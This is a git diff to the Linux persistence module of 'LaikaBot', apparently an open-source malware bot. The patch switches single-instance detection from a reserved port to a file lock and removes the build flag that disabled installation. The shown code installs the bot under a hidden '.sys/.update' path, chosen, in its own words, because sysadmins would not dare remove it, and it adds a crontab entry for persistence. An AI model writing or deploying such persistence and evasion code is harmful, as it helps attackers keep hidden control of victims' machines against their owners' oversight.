@@ -1,24 +1,26 @@
 /* platform specific code for achieving persistence on linux */
 
-/* this is only used to check if another instance of laika is currently running */
-#define LAIKA_RESERVED_PORT 32876
-#define LAIKA_TMP_FILE "/tmp/laikaTMP"
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/file.h>
+#include <pwd.h>
+
+#include "persist.h"
+#include "lconfig.h"
+#include "lsocket.h"
+#include "lerror.h"
+#include "lmem.h"
+
+/*      we want a semi-random file lock that is stable between similar builds,
+*   so we use the GIT_VERSION as our file lock :D */
+#define LAIKA_LOCK_FILE "/tmp/" LAIKA_VERSION_COMMIT
 
 /* most sysadmins probably wouldn't dare remove something named '.sys/.update' */
 #define LAIKA_INSTALL_DIR_USER ".sys"
 #define LAIKA_INSTALL_FILE_USER ".update"
 
-#include "persist.h"
-#include "lsocket.h"
-#include "lerror.h"
-#include "lmem.h"
-
-#include <unistd.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <pwd.h>
-
-static struct sLaika_socket laikaB_markerPort;
+static int laikaB_lockFile;
 
 /* check if laika is running as super-user */
 bool laikaB_checkRoot() {
@@ -27,22 +29,25 @@ bool laikaB_checkRoot() {
 
 /* mark that laika is currently running */
 void laikaB_markRunning() {
-#ifndef DEBUG
-    LAIKA_TRY
-        laikaS_initSocket(&laikaB_markerPort, NULL, NULL, NULL, NULL);
-        laikaS_bind(&laikaB_markerPort, LAIKA_RESERVED_PORT);
-    LAIKA_CATCH
-        LAIKA_DEBUG("Failed to bind marker port, laika is already running!\n");
-        exit(0);
-    LAIKA_TRYEND
-#endif
+    /* create lock file */
+    if ((laikaB_lockFile = open(LAIKA_LOCK_FILE, O_RDWR | O_CREAT, 0666)) == -1)
+        LAIKA_ERROR("Couldn't open file lock! Another LaikaBot is probably running.\n");
+
+    /* create lock */
+    if (flock(laikaB_lockFile, LOCK_EX | LOCK_NB) != 0)
+        LAIKA_ERROR("Failed to create file lock!\n");
+
+    LAIKA_DEBUG("file lock created!\n");
 }
 
 /* unmark that laika is currently running */
 void laikaB_unmarkRunning() {
-#ifndef DEBUG
-    laikaS_kill(&laikaB_markerPort);
-#endif
+    /* close lock */
+    if (flock(laikaB_lockFile, LOCK_UN) != 0)
+        LAIKA_ERROR("Failed to close file lock!\n");
+
+    close(laikaB_lockFile);
+    LAIKA_DEBUG("file lock removed!\n");
 }
 
 void getCurrentExe(char *outPath, int pathSz) {
@@ -109,7 +114,6 @@ void tryPersistCron(char *path) {
 
 /* try to gain persistance on machine */
 void laikaB_tryPersist() {
-#ifndef LAIKA_NOINSTALL
     char exePath[PATH_MAX];
     char installPath[PATH_MAX];
 
@@ -130,7 +134,6 @@ void laikaB_tryPersist() {
     LAIKA_CATCH
         LAIKA_DEBUG("crontab not installed or not accessible!");
     LAIKA_TRYEND
-#endif
 }
 
 /* try to gain root */
